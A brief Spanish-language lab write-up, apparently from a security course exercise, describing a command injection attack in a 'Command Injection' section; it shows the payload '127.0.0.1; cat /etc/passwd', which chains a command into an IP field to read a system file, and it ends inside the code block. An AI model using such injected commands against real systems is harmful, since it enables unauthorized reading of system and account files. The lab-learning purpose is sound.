# Ataque 3 - Inyección de Comandos

## 1. Evidencia del Ataque
El ataque lo realicé en la sección "Command Injection"[cite: 2, 4]. Aproveché el campo de IP para encadenar comandos usando el punto y coma (`;`). El payload fue[cite: 2, 4]:

```bash
127.0.0.1; cat /etc/passwd